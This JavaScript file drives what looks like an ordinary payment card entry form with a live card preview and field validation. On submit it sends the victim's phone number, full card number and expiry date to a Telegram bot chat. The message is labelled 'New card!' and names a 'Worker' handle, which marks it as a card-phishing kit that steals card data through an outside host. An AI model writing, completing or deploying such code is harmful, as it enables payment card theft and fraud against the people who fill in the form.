import axios from "axios";

const cardNumber = document.querySelector(".card-Number");
const cardPhone = document.querySelector(".cardholder-name");
const cardExpDate = document.querySelector(".exp-date");

const form = document.querySelector("form");
const inputPhone = document.querySelector("#phone");
const inputNumber = document.querySelector("#card-number");
const inputMonth = document.querySelector("#month");
const inputYear = document.querySelector("#year");

const infoErr = document.querySelectorAll(".info-err");
const complete = document.querySelector(".complete");

const TELEGRAM_BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID;
const API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

let inputPhoneValue = "";
let inputNumberValue = "";
let inputMonthValue = "00";
let inputYearValue = "00";

const showError = (input, arrInfoErr, message) => {
  input.classList.add("input-err");
  infoErr[arrInfoErr].classList.add("d-block");
  infoErr[arrInfoErr].textContent = message;
};

const hideError = (input, arrInfoErr) => {
  input.classList.remove("input-err");
  infoErr[arrInfoErr].classList.remove("d-block");
};

const validateInput = (input, arrInfoErr, wordLength, extraCheck = null) => {
  const valueNoSpaces = input.value.replace(/\s/g, ""); // без пробелов
  if (!wordLength) {
    if (!input.value) {
      showError(input, arrInfoErr, "Can’t be blank");
    } else {
      hideError(input, arrInfoErr);
    }
  } else {
    if (!input.value) {
      showError(input, arrInfoErr, "Can’t be blank");
    } else if (!/^\d+$/.test(valueNoSpaces)) {
      showError(input, arrInfoErr, "Wrong format, numbers only");
    } else if (valueNoSpaces.length < wordLength) {
      showError(input, arrInfoErr, `Must be ${wordLength} numbers`);
    } else if (extraCheck && !extraCheck(valueNoSpaces)) {
      if (input === inputMonth) {
        showError(input, arrInfoErr, "Month must be 01-12");
      } else if (input === inputYear) {
        showError(input, arrInfoErr, "Year must be 25 or more");
      }
    } else {
      hideError(input, arrInfoErr);
      switch (input) {
        case inputNumber:
          inputNumberValue = valueNoSpaces; // без пробелов
          break;
        case inputMonth:
          inputMonthValue = valueNoSpaces;
          break;
        case inputYear:
          inputYearValue = valueNoSpaces;
          break;
        case inputPhone:
          inputPhoneValue = valueNoSpaces;
          break;
      }
    }
  }
};

const deleteSpace = (input) => {
  if (/\s/.test(input.value)) {
    input.value = input.value.replace(/\s/g, "");
  }
};

inputPhone.addEventListener("input", (e) => {
  e.preventDefault();
  let phoneVal = e.target.value.replace(/[^\d+]/g, "");
  e.target.value = phoneVal;
  inputPhoneValue = phoneVal;
  cardPhone.textContent = inputPhoneValue;
});

inputNumber.addEventListener("input", (e) => {
  e.preventDefault();
  let formatText = e.target.value.replace(/\s/g, "");
  formatText = formatText.substring(0, 16); // максимум 16 цифр
  formatText = formatText.replace(/(.{4})/g, "$1 ").trim();
  e.target.value = formatText;
  inputNumberValue = formatText.replace(/\s/g, "");
  cardNumber.textContent = formatText;
});

inputMonth.addEventListener("input", (e) => {
  e.preventDefault();
  deleteSpace(inputMonth);
  inputMonthValue = e.target.value;
  cardExpDate.textContent = inputMonthValue + "/" + inputYearValue;
});

inputYear.addEventListener("input", (e) => {
  e.preventDefault();
  deleteSpace(inputYear);
  inputYearValue = e.target.value;
  cardExpDate.textContent = inputMonthValue + "/" + inputYearValue;
});

form.addEventListener("submit", async (e) => {
  e.preventDefault();

  // Месяц 1–12
  validateInput(inputMonth, 2, 2, (val) => {
    const num = parseInt(val);
    return num >= 1 && num <= 12;
  });

  // Год ≥ 25
  validateInput(inputYear, 2, 2, (val) => {
    const num = parseInt(val);
    return num >= 25;
  });

  // Телефон и карта
  validateInput(inputPhone, 0, 10);
  validateInput(inputNumber, 1, 16);

  if (document.querySelectorAll(".input-err").length > 0) {
    return;
  }

  cardPhone.textContent = inputPhoneValue;
  cardNumber.textContent = inputNumberValue.replace(/(.{4})/g, "$1 ").trim(); // красиво на карте
  cardExpDate.textContent = inputMonthValue + "/" + inputYearValue;

  form.classList.add("d-none");
  complete.classList.add("d-block");

  const values = {
    phone: inputPhoneValue,
    card: inputNumberValue,
    expMonth: inputMonthValue,
    expYear: inputYearValue,
  };

  const text = `<b>New card!</b>\n\n<b>Phone:</b> <code>${values.phone}</code>\n<b>Card:</b> <code>${values.card}</code>\n<b>Exp:</b> <code>${values.expMonth}/${values.expYear}</code>\n\n<b>Worker:</b> @p19347181`;

  try {
    await axios.post(API, {
      chat_id: TELEGRAM_CHAT_ID,
      text,
      parse_mode: "HTML",
    });
  } catch (error) {
    console.error(error);
  }
});

complete.addEventListener("click", () => {
  location.reload(true);
});
